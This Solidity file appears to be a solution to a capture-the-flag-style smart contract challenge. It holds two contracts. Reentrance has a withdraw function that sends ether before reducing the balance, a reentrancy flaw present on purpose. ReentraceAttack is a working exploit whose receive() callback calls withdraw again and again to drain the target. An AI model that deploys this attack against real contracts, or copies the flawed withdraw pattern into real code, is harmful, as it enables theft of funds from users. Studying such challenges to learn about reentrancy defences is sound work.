// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract ReentraceAttack {
  Reentrance public reentrance;
  uint balance;
  address owner;

  constructor(Reentrance _reentrance) public {
    owner = msg.sender;
    reentrance = Reentrance(_reentrance);
  }


  function attack() external payable {
    require(msg.sender == owner);
    balance = msg.value;
    reentrance.donate{value: msg.value}(address(this));
    reentrance.withdraw(msg.value);
  }

  receive() external payable {
      reentrance.withdraw(balance);
  }
}